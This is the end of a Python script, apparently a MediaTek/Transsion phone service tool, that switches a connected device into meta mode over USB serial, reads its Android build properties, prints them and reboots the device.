    except Exception:
        pass

    # Not in meta mode yet. Try BROM meta entry.
    print(RED + "not in meta" + RESET, end=" ", flush=True)
    enter_meta_brom(pl)
    time.sleep(2)

    # Re-scan for meta COM port (any MTK PID).
    s.close()
    time.sleep(1)
    print("Searching for meta device...", end=" ", flush=True)
    for attempt in range(30):
        for p in serial.tools.list_ports.comports():
            if p.vid == MTK_VID:
                mode = KNOWN.get(p.pid, "meta")
                baud = 115200 if p.pid == 0x0003 else 921600
                try:
                    s2 = serial.Serial(p.device, baud, timeout=10)
                    # Try meta framing to see if device responds.
                    meta = TranssionMeta(s2)
                    try:
                        resp = meta.send_at("AT")
                    except Exception:
                        s2.close()
                        continue
                    print(GREEN + "OK" + RESET, flush=True)
                    print("Reading system information...", end=" ", flush=True)
                    props = meta.read_info()
                    print(GREEN + "OK" + RESET)
                    _print_props(props, hw)
                    meta.reboot()
                    s2.close()
                    return True
                except Exception:
                    continue
        time.sleep(1)
    print(RED + "Failed" + RESET)
    return False


def _print_props(props, hw):
    print()
    print("Chipset type:", chip_name(hw))
    print("Security patch:", props.get("ro.build.version.security_patch", ""))
    print("Build Date:", props.get("ro.build.date", ""))
    print("Build Number:", props.get("ro.build.id", ""))
    print("Incremental:", props.get("ro.build.version.incremental", ""))
    print("SDK Version:", props.get("ro.build.version.sdk", ""))
    print("Device Brand:", props.get("ro.product.brand", ""))
    print("Android Ver:", props.get("ro.build.version.release", ""))
    print("Model:", props.get("ro.product.model", ""))
    print("Device:", props.get("ro.product.device", ""))
    print("Product:", props.get("ro.product.name", ""))
    print("Hardware:", props.get("ro.hardware", ""))
    print("Board:", props.get("ro.board.platform", ""))
    print("Display ID:", props.get("ro.build.display.id", ""))
    print("Description:", props.get("ro.build.description", ""))


if __name__ == "__main__":
    main()
